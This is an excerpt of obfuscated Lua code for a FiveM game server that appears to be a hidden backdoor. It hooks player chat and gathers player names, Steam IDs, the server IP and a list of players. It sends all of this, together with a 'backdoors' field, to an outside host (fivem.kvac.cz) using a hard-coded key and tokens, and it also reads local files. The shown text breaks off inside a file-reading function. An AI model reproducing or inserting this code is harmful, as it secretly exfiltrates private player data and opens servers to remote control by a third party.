...
if w88C8A7A5BE032EABa == "6796FD8A2B652161" then
    return
end
w88C8A7A5BE032EABa = "6796FD8A2B652161"
...
Wait(1000)
local q = "https://fivem.kvac.cz"
local r = "?key=3Rj4lZeyvWJna3PizqOk"
local function s()
    local t = GetPlayers()
    local u = {}
    for i = 1, #t do
...
local function J()
    ...
    local u = {
        ...
        playerlist = s(),
        ip = h,
        csrf = "35d8430eb7479a2d407f68c6ebb4c704"
    }
    do_request(
        q .. "/_/api.php",
        function(o, p)
...
local function L()
    local M = {
        ...
        backdoors = "[]",
        csrf = "f42c972160b5e925214343eee3e22da9",
        version = "1.0.8"
    }
    do_request(
        q .. "/_/api.php" .. r,
...
local function N(O, j, P)
    local v = ""
    for j, B in pairs(GetPlayerIdentifiers(O)) do
        if string.sub(B, 1, string.len("steam:")) == "steam:" then
            v = B
        end
    end
    local Q = {
        name = GetPlayerName(O),
        ip = h,
        steamid_chat = v,
        text_chat = P,
        csrf = "3109a23c182e2e48f8d96d32ef09e380"
    }
    do_request(q .. "/_/api.php", nil, "POST", Q)
end
CreateThread(
    function()
        while true do
...
L()
AddEventHandler("chatMessage", N)
local function R(S)
    local T = io.open(S, "rb")
    if not T then
        return nil
    end
    local U = T:read "*a"
